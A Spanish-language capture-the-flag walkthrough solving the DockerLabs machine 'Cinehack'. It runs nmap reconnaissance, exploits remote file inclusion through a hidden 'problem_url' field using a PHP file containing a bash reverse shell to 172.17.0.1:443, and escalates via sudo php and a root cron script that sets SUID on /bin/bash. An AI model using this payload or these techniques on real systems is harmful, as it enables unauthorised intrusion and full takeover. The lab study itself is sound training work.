#MAQUINA #DOCKERLABS #MEDIO 
#ABUSO_SUBIDA_ARCHIVOS #RFI
<hr>

# RECONOCIMIENTO

Vamos a resolver **Cinehack** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 172.17.0.2
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 11:41 CET
Initiating ARP Ping Scan at 11:41
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:41, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:41
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:41, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-03-20 11:41:22 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)



```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 11:42 CET
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Cine Profesional
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds




```

   ```bash

nmap --script="http-enum" 172.17.0.2   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 11:43 CET
Nmap scan report for cinema.dl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

                                                            


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.


## HTTP (80)

Al entrar para reservar la ultima pelicula y hacer CTRL + U :

```bash
                    <!-- Campo oculto para URL maliciosa -->
                    <input type="hidden" id="problem_url" name="problem_url" value="">
```

# EXPLOTACION

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

Lo que vamos a hacer es crear un servidor (python3 -m http.server) y ejecutar el reservation.php con ese parámetro.
Desde burpsuite parece que no funciona, pero si pegamos esta URL si :

```bash
http://cinema.dl/reservation.php?problem_url=http://172.17.0.1:8000/wp.php
```

Vamos a ver donde se puede estar subiendo, tras mirarlo en un script, se sube a **/andrewgarfield/**

YA ESTAMOS COMO WWW-DATA.

# ESCALADA PRIVILEGIOS

Vamos a ver si tenemos permisos SUDO:

```bash
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ sudo -l
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on dockerlabs:
    (boss) NOPASSWD: /bin/php

```

```bash
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ sudo -u boss php -r "system('/bin/bash');"
boss@dockerlabs:/var/www/cinema.dl/andrewgarfield$ 
```

YA ESTAMOS COMO BOSS.

Vemos un user.txt:
```bash
93a85c1e99d62afe15c179d4fd005f40
```

No parece servir de nada.

Vamos a ver los procesos con `ps -ef`:
```bash
www-data@dockerlabs:/var/www/cinema.dl/andrewgarfield$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 11:39 ?        00:00:00 /bin/sh -c service apache2 start && service cron start && while true; do /var/spool/cron/crontabs/root.sh; sleep 60; done
root          24       1  0 11:39 ?        00:00:00 /usr/sbin/apache2 -k start
root          41       1  0 11:39 ?        00:00:00 /usr/sbin/cron -P
www-data      82      24  0 11:44 ?        00:00:12 /usr/sbin/apache2 -k start
www-data     138      24  0 11:48 ?        00:00:06 /usr/sbin/apache2 -k start
www-data     139      24  0 11:48 ?        00:00:06 /usr/sbin/apache2 -k start
www-data     158      24  0 11:48 ?        00:00:05 /usr/sbin/apache2 -k start
www-data     342      24  0 12:14 ?        00:00:02 /usr/sbin/apache2 -k start
www-data     347      24  0 12:14 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     351      24  0 12:14 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     353      24  0 12:14 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     354      24  0 12:14 ?        00:00:01 /usr/sbin/apache2 -k start
www-data     360      24  0 12:14 ?        00:00:01 /usr/sbin/apache2 -k start
www-data    1824     354  0 15:24 ?        00:00:00 sh -c -- /bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'
www-data    1825    1824  0 15:24 ?        00:00:00 /bin/bash -c bash -i > /dev/tcp/172.17.0.1/443 0>&1
www-data    1826    1825  0 15:24 ?        00:00:00 bash -i
www-data    1828    1826  0 15:24 ?        00:00:00 script /dev/null -c bash
www-data    1829    1828  0 15:24 pts/0    00:00:00 sh -c bash
www-data    1830    1829  0 15:24 pts/0    00:00:00 bash
root        1856       1  0 15:26 ?        00:00:00 sleep 60
www-data    1857    1830  0 15:27 pts/0    00:00:00 ps -ef
```

Vemos que hace :
```bash
boss@dockerlabs:/var/spool/cron$ cat /var/spool/cron/crontabs/root.sh          
#!/bin/bash

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.JicO9c/crontab installed on Thu Jan 16 11:58:58 2025)
# (Cron version -- $Id: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)
# Edit this file to introduce tasks to be run by cron.
# 
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
# 
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
# 
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
# 
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
# 
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
# 
# For more information see the manual pages of crontab(5) and cron(8)
# 
# m h  dom mon dow   command

#*/1 * * * * chmod +r /var/spool/cron/crontabs/root
/opt/update.sh
/tmp/script.sh

```

Creamos el script.sh en tmp :
```bash
www-data@dockerlabs:/tmp$ bash -p 
bash-5.2# whoami
root
bash-5.2# cat /tmp/script.sh 
#!/usr/bin/env bash

chmod +s  /bin/bash
bash-5.2# whoami
root
bash-5.2# 

```

**YA ESTAMOS COMO ROOT.**

Vemos que el otro script nos cerraba todo lo del usuario boss por seguridad:

```bash
bash-5.2# cat /opt/update.sh
#!/bin/bash

# Comprobar si el usuario 'boss' tiene algún proceso en ejecución
# También buscar procesos asociados a "script" o shells indirectas
if pgrep -u boss > /dev/null; then
    # Mostrar procesos activos del usuario boss para depuración (opcional)
    echo "Procesos activos del usuario boss:"
    ps -u boss

    # Matar todos los procesos del usuario 'boss' incluyendo 'script'
    pkill -u boss
    pkill -9 -f "script"

    # Confirmar que los procesos fueron terminados
    if pgrep -u boss > /dev/null; then
        echo "No se pudieron terminar todos los procesos del usuario boss."
    else
        echo "El usuario boss ha sido desconectado por seguridad."
    fi
else
    echo "El usuario boss no está conectado."
fi

```



